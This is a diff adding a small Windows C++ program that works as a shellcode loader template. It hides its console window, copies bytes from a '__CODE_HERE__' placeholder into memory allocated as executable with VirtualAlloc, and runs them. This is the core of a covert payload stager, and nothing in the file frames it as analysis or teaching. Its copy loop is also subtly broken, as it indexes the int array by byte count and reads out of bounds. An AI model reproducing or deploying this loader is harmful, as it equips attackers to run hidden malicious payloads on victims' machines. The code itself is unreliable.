@@ -1,0 +1,23 @@
+#include <windows.h>
+#include <iostream>
+
+int main(int argc, char **argv)
+{
+
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    int b[] = {__CODE_HERE__};
+
+    char c[sizeof b];
+
+    for (int i = 0; i < sizeof b; i++)
+    {
+        c[i] = b[i];
+    }
+
+    void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    memcpy(exec, c, sizeof c);
+
+    ((void (*)())exec)();
+}
